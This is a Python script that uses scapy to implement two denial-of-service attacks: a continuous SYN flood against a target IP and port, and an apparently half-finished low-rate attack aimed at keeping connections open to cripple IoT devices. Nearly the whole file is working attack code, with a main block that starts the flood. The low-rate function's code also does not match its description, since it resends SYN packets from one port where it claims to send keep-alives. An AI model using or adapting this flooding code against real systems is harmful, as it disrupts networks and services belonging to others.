#! /usr/bin/python3
import multiprocessing
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import IP,TCP,send,RandShort


def BasicDos(dest="127.0.0.1", sourceport=RandShort(),destport=80):
    """
    Basic Denial of Service attack. 
    Idea is that the function will run continuously, creating an connection initiation packet and sending it to the target IP:Port
    This will run very quickly in theory, due to the fact there is no delay between crafting packets.
    In theory this may create network connection issues on the host machine too as it is continuous crafting/sending packets. This would be on a case by case basis
    """
    try:
        dst_ip = dest
        src_port = sourceport
        dst_port=destport
        print("Commencing Denial of Service on %s:%d" %(dst_ip,dst_port))
        print("To stop attack, use Keyboard Interrupt")
        while True:
            send(IP(dst=dst_ip)/TCP(sport=src_port,dport=dst_port,flags="S")/"Hello There",timeout=10, verbose=0)
    except KeyboardInterrupt:
        print("Detected Keyboard Interrupt, stopping...")
        return

def LowRateDos(dest="127.0.0.1",destport=80,number_of_connections=2):
    """
    Works in a similar way to Basic Denial of Service, main distinction is that Low rate will create a series of started connections and then just keep the connections alive without doing anything.
    The idea is that you cripple the network rather than knock the system offline. 
    This will likely be a low number necessary to render a device unusable with IoT due to smaller spec internals.
    This is also know as RUDY - R U Dead Yet? 
    Current Though process:
        Take an inputted mumber of connections, x
        Create x connections, record port numbers for each of these
        every Y seconds, send a "keep alive" packet from each port
        ???
        Profit.
    """
    try:
        import time
        dst_ip = dest
        dst_port=destport
        port_list = []
        for con in range(1,number_of_connections+1):
            src_port = RandShort()
            send(IP(dst=dst_ip)/TCP(sport=src_port,dport=dst_port,flags="S")/"Hello There",timeout=10, verbose=0)
            port_list.append(src_port)
        while True:
            time.sleep(60) # Wait for a minute between sending ACK to keep connection alive
            for port in port_list:
                send(IP(dst=dst_ip)/TCP(sport=src_port,dport=dst_port,flags="S")/"Hello There",timeout=10, verbose=0)
    except KeyboardInterrupt:
        print("Detected Keyboard Interrupt, stopping...")
        return

#TODO Test this!!
if __name__ == "__main__":
    BasicDos()
    
